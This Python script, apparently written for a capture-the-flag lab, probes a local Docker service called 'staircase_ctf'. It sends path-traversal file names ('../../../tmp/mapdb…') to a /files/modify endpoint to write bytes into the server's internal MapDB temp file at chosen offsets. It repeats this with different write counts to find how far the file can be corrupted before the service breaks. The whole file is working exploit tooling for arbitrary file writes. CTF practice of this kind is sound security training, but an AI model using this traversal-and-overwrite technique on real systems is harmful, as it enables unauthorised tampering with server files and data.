#!/usr/bin/env python3
"""
精确测试：找出恰好的安全写入范围
"""
import requests
import base64
import subprocess
import time
import struct

def restart_container():
    subprocess.run("docker stop staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker rm staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker run -d --name staircase_ctf -p 8080:8080 staircase:latest", shell=True, capture_output=True)
    time.sleep(5)

def get_mapdb_name():
    result = subprocess.run('docker exec staircase_ctf sh -c "ls /tmp/mapdb*temp | head -1"', 
                           shell=True, capture_output=True, text=True)
    return result.stdout.strip().split('/')[-1]

def multi_write(mapdb_name, start_offset, num_writes):
    """连续写入多次"""
    url = 'http://localhost:8080'
    mapdb_path = f"../../../tmp/{mapdb_name}"
    
    for i in range(num_writes):
        offset = start_offset + i * 20
        data = bytes([i % 256] * 8)
        
        payload = {
            'fileName': mapdb_path,
            'data': base64.b64encode(data).decode(),
            'offset': offset
        }
        
        resp = requests.put(f'{url}/files/modify', json=payload, timeout=5)
        if resp.status_code != 200:
            return i, f"Write {i} failed at offset 0x{offset:x}"
    
    # 最后写入的结束位置
    end_offset = start_offset + num_writes * 20
    return num_writes, f"OK, wrote up to offset 0x{end_offset:x}"

def check_icon():
    """检查 icon 是否可读"""
    try:
        resp = requests.get('http://localhost:8080/files/icon', timeout=5)
        return resp.status_code
    except Exception as e:
        return f"Error: {e}"

def get_error_log():
    """获取错误日志"""
    result = subprocess.run('docker logs --tail 5 staircase_ctf 2>&1', 
                           shell=True, capture_output=True, text=True)
    return result.stdout

def main():
    # 从 0x100249 开始写入
    # 每次 20 bytes
    # 测试不同的写入次数
    
    start_offset = 0x100249
    
    print("Finding the safe write limit...")
    print(f"Start offset: 0x{start_offset:x}")
    print("-" * 70)
    
    for num_writes in [5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]:
        restart_container()
        mapdb_name = get_mapdb_name()
        
        writes_done, msg = multi_write(mapdb_name, start_offset, num_writes)
        icon_status = check_icon()
        
        end_offset = start_offset + num_writes * 20
        
        status = "✓" if icon_status == 404 else ("OK" if icon_status == 200 else "?")
        print(f"Writes={num_writes:2d}, end=0x{end_offset:05x}, icon={icon_status:>4}, status={status}")
        
        if icon_status != 200 and icon_status != 404:
            print(f"  Error log: {get_error_log()[:200]}")

if __name__ == "__main__":
    main()
